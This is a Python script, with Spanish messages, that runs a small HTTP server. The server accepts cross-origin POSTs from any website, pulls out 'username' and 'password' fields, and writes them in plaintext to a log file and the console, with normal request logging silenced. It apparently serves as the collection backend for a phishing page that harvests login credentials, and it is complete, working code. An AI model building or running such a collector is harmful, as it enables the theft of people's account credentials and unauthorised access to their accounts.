import http.server
import socketserver
import json
import threading
import socket
import os
from datetime import datetime

LOG_DIR = "logs"
os.makedirs(LOG_DIR, exist_ok=True)
LOG_FILE = os.path.join(LOG_DIR, "post_logs.txt")

def find_free_port(start=8080, end=9000):
    for port in range(start, end):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            try:
                s.bind(("", port))
                return port
            except OSError:
                continue
    raise OSError("❌ No se encontró ningún puerto libre.")

class PostHandler(http.server.BaseHTTPRequestHandler):
    def _set_cors_headers(self):
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")

    def do_OPTIONS(self):
        self.send_response(200)
        self._set_cors_headers()
        self.end_headers()

    def do_POST(self):
        content_length = int(self.headers.get("Content-Length", 0))
        raw_body = self.rfile.read(content_length).decode("utf-8")

        try:
            data = json.loads(raw_body)
            username = data.get("username")
            password = data.get("password")
        except Exception as e:
            self.send_response(400)
            self._set_cors_headers()
            self.send_header("Content-Type", "text/plain; charset=utf-8")
            self.end_headers()
            self.wfile.write("JSON inválido".encode("utf-8"))
            return

        # Registro
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"[{timestamp}] USERNAME: {username} | PASSWORD: {password}"
        print(log_entry)

        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(log_entry + "\n")

        self.send_response(200)
        self._set_cors_headers()
        self.send_header("Content-Type", "text/plain; charset=utf-8")
        self.end_headers()
        self.wfile.write("Recibido correctamente\n".encode("utf-8"))

    def log_message(self, format, *args):
        return  # Silenciar logs por consola

def start_post_server():
    port = find_free_port()
    server = socketserver.TCPServer(("", port), PostHandler)

    ip = socket.gethostbyname(socket.gethostname())
    print(f"📡 POST server escuchando en: http://{ip}:{port}/")

    thread = threading.Thread(target=server.serve_forever)
    thread.daemon = True
    thread.start()
    return port
